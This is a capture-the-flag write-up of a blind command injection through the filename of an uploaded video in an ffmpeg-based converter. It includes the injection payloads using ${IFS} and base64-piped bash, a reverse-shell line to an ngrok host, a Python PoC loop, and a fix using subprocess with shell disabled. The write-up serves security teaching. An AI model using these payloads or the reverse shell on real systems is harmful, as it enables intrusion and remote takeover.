# ````````````Introduction````````````

Every month, `INTIGRITI` releases a new challenge, usually about `XSS` (they love it).

The rules were pretty simple:

| 1. do NOT reveal the solution until the challenge is over!  |
| --- |
| 2. this challenge runs from the 17th of July until the 25th of July, 11:59 PM CET. |
| 3. Out of all correct submissions, we will draw six winners on Tuesday, the 25th July: (3 randomly drawn, 3 best write-ups) |
| 4. Every winner gets a ‚Ç¨50 swag voucher for our https://swag.intigriti.com/. |

Instead, as to the objective of the challenge we had these information:

> Find the flag and win `[INTIGRITI](https://www.intigriti.com/)` swag.

Not much, but still‚Ä¶ the swag $üòÄ$

# ``````TL;DR``````

The challenge consisted in a vulnerability of the file upload functionality. Specifically, a blind command injection via filename.

# `The challenge`

## ``````0 - Recon``````

![chall_firstlook.png](/assets/images/intigriti/chall_firstlook.png)

At first glance, the website looks very simple: we upload a video and we get back the extracted audio in `.mp3` format.
Looking for the technologies using [wappalyzer](https://www.wappalyzer.com/), we do not obtain useful information:
 

![chall_technologies.png](/assets/images/intigriti/chall_technologies.png)

## `1 - Enumeration`

### `1.1) Analyzing upload request`

Let‚Äôs take a look at the upload functionality intercepting the request with BurpSuite.

![burp_upload_req.png](/assets/images/intigriti/burp_upload_req.png)

Looking at the response we already see some interesting strings in the `extracted_audio.wav` file, like `Lavf58.20.100` which presumably is the version of the tool/library that‚Äôs being used.

### `1.2) Inspecting converted file metadata`

To confirm that, I uploaded the video again without intercepting the request and look into the file metadata using `exiftool`:

![exiftool_audio.png](/assets/images/intigriti/exiftool_audio.png)

So it‚Äôs confirmed that it‚Äôs using `Lavf` software, which stands for [libavformat](https://ffmpeg.org/doxygen/trunk/group__libavf.html), and very likely it‚Äôs using it from `ffmpeg`.
Source code isn‚Äôt provided, but as black-box approach we can assume it‚Äôs doing something like:

```bash
ffmpeg -i video.mp4 [OPTIONS] -vn extracted_audio.mp3
```

which gives us similar results:

![exiftool_audio_2.png](/assets/images/intigriti/exiftool_audio_2.png)

### `1.3) Finding blind RCE in uploaded file name`

Knowing that the `.mp4` filename is user controllable, if it‚Äôs being manipulated unsafely, we could obtain OS command injection.
Let‚Äôs try something very simple, i.e `;id;video.mp4`, in order to verify the vulnerability. If we have injection, the resulting command that will be executed will be the following:

```bash
ffmpeg -i ;id;video.mp4 [OPTIONS] -vn extracted_audio.mp3
```

but we get error `500`:

![error_500.png](/assets/images/intigriti/error_500.png)

We are, in fact, breaking the `ffmpeg` command. 
It‚Äôs possible that in the backend the command is raising an exception because of the broken `ffmpeg` command and returning error `500` even if it‚Äôs executing the `id` command successfully.
Let's try to elaborate our payload a bit more.
`2>/dev/null;id;#video.mp4` as filename should evaluate to:

```bash
ffmpeg -i 2>/dev/null;id;#video.mp4 [OPTIONS] -vn extracted_audio.mp3
```

but we still get error `500` and cannot see the output/errors.

At this stage we have to try it blindly.
Firstly, some basic payloads, like: `sleep 5`. If the server hangs, it‚Äôs RCE.
Nevertheless, `;sleep 5;#video.mp4` as filename will trigger another error:

> `Invalid filename, please make sure it is an MP4 file and does not contain any white spaces in the filename`
> 

**How can we inject useful commands without spaces?**
Fortunately there is an easy way to circumvent this limitation using `${IFS}`.

> `IFS` stands for "internal field separator". It is used by the shell to determine how to do word splitting, i. e. how to recognize word boundaries. The default value for `IFS` consists of whitespace characters, therefore if we call `${IFS}` in a bash shell it will act as a whitespace.
> 

So the payload becomes:

```bash
;sleep${IFS}5;#video.mp4
```

Aand It works! Finally the feedback I was searching for, a delay in the response.

# `2 - Exploitation`

![hacking.gif](/assets/images/intigriti/hacking.gif)

### `2.1) Why this works?`

As we supposed earlier, let‚Äôs assume that, the back-end, in response to our request, is executing the following command: 
`ffmpeg -i user-input.mp4 -vn extracted_audio.mp3`.
Where `user-input` is the filename we sent in the request.
Thus, this is what the server will see after we inject the sleep payload:

```bash
ffmpeg -i ;sleep${IFS}5;#video.mp4 -vn extracted_audio.mp3
```

And it will execute all three commands, even if they return an error, because `;` command separator will execute commands regardless of the result of the previous, So:

- `ffmpeg -i`, leads to an error.
- `sleep 5`, causes a 5 second delay.
- `.mp4 -vn extracted_audio.mp3`, leads to another error.

Nice. We confirmed the command injection‚Ä¶ and now what? We want a shell. 
So let's go and refine our payload.

First things first, I wanted to have a solid and bullet-proof payload, so I could easily mess with different commands on the victim server without worrying about spaces.

This is what I came up with:

```bash
;echo${IFS}"base64_encoded_command"|base64${IFS}-d|bash;
```

with this i don‚Äôt have to worry about the command I decide to send, cause it is base64 encoded.

Now you can apply the same logic with any command you want. So, let‚Äôs spawn a shell.
Firstly we‚Äôll need a public IP. We can use [ngrok](https://ngrok.com/) for this task ([take a look at how it works](https://ngrok.com/docs)).
For the payload itself, I used one from [revshells.com](https://www.revshells.com/):

```bash
sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/18418/ 0>&1
```

## `3 - PoC`

To exploit this vulnerability I created the following (really simple) script to help me testing different commands

```python
import requests
import base64

url = "https://challenge-0723.intigriti.io:443/upload"
headers = {"User-Agent": "Samsung Fridge"}

while (True):
    print("cmd> ", end="")
    cmd = input()
    cmd_enc = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
    print(f"Executing '{cmd}' on the remote machine...")

    filename = f";echo {cmd_enc} |base64 -d|bash;".replace(' ', '${IFS}')
    files = {'video': (f"{filename}", open("/path/to/video.mp4","rb"), "video/mp4")}

    r = requests.post(url, headers=headers, files=files)
```

Start `nc` listener (`nc -lnvp 1337`), start `ngrok` in tcp mode (`ngrok tcp 1337`) and send the payload.

## `4 - Mitigation`

### `4.1) Identifying the threat`

Let‚Äôs see how this vulnerability could be avoided. We took the challenge files thanks to our previous rev-shell. This is the `app.py`:

```python
from flask import Flask, request, render_template, send_file, jsonify, make_response
from werkzeug.exceptions import InternalServerError
from helpers import *

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/challenge')
def challenge():
    return render_template('challenge.html')

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        file = request.files['video']
        filename = file.filename

        if file:
            if validate_filename(filename):
                valid_filename = filename
            else:
                return render_template('error.html', error='Invalid filename, please make sure it is an MP4 file and does not contain any white spaces in the filename')

            video_path = f'misc/{valid_filename}'
            
            file.save(video_path)
            
            audio_path = 'misc/extracted_audio.wav'

            success, error = extract_audio(video_path, audio_path)
            
            if success:
                return send_file(audio_path, as_attachment=True)
            else:
                # Raise InternalServerError to trigger the error handler
                raise InternalServerError(error)

    return render_template('upload.html')

# Custom error handler for InternalServerError (500 error)
@app.errorhandler(InternalServerError)
def handle_internal_server_error(e):
    response = {
        'error': 'That wasn\'t supposed to happen',
        'message': 'Hey, stop trying to break things!!'
    }
    return make_response(jsonify(response), 500)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=False)
```

`extract_audio()` function is the one we‚Äôre interested in. However, it isn‚Äôt declared.
Note how it‚Äôs importing all methods of `helpers.py`:

```python
from helpers import *
```

So, let‚Äôs look into that.

```python
import subprocess, re

def validate_filename(filename):
    try:
        pattern = r"^[^\s]+\.(mp4)$"

        if re.match(pattern, filename):
            return True
        else:
            return False

    except Exception as e:
        return False

def extract_audio(video_path, audio_path):
    try:
        command = f"""ffmpeg -i {video_path} -vn -acodec libmp3lame -ab 192k -ar 44100 -y -ac 2 {audio_path}"""

        r = subprocess.run(command, shell=['/bin/bash'], capture_output=True)
    
        if r.returncode != 0:
            return False, r.stderr
        else:
            return True, ''
    
    except Exception as e:
        return False, e
```

Ok, that‚Äôs a **VERY** insecure pattern. Here we have 2 main issues:

1. **Input Handling**: it‚Äôs formatting the command to execute with format strings without any sanitization or validation. That's why we could chain our payload to the command.
2. **Unsafe subprocess execution**: Here, the problem is not due to `subprocess.run`. Instead, on how it‚Äôs being used.

According to [Subprocess Documentation](https://docs.python.org/3/library/subprocess.html#security-considerations):

> *Unlike some other popen functions, the default implementation will never implicitly call a system shell. This means that all characters, including shell metacharacters, can safely be passed to child processes.
If the shell is invoked explicitly, via `shell=True`, it is the application‚Äôs responsibility to ensure that all whitespace and metacharacters are quoted appropriately to avoid [shell injection](https://en.wikipedia.org/wiki/Shell_injection#Shell_injection) vulnerabilities. On [some platforms](https://docs.python.org/3/library/shlex.html#shlex-quote-warning), it is possible to use `[shlex.quote()](https://docs.python.org/3/library/shlex.html#shlex.quote)` for this escaping.*
> 

In this case, it‚Äôs set as `shell=['/bin/bash']` which is almost the same as `shell=True` (the only difference is that on Unix with `shell=True`, the shell defaults to `/bin/sh`).

### `4.2) A better approach`

As the [Subprocess Documentation](https://docs.python.org/3/library/subprocess.html#security-considerations) suggests, when using `subprocess.run`, you need to pass the command and its arguments as a list of strings. The first element of the list should be the command you want to execute, and any additional elements represent the arguments for that command.
This way, the command and its arguments are provided separately, and we cannot call any other commands, or escape the specified one.

Here‚Äôs an example of how the app would have been more secure:

```python
import subprocess, re

def validate_filename(filename):
    try:
        pattern = r"^[^\s]+\.(mp4)$"

        if re.match(pattern, filename):
            return True
        else:
            return False

    except Exception as e:
        return False

def extract_audio(video_path, audio_path):
    try:
        command = [
            "ffmpeg",
            "-i", video_path,
            "-vn",
            "-acodec", "libmp3lame",
            "-ab", "192k",
            "-ar", "44100",
            "-y",
            "-ac", "2",
            audio_path
        ]

        r = subprocess.run(command, shell=False, capture_output=True)
    
        if r.returncode != 0:
            return False, r.stderr.decode()
        else:
            return True, ''
    
    except Exception as e:
        return False, str(e)
```

And now our exploit is neutralized üôÇ.
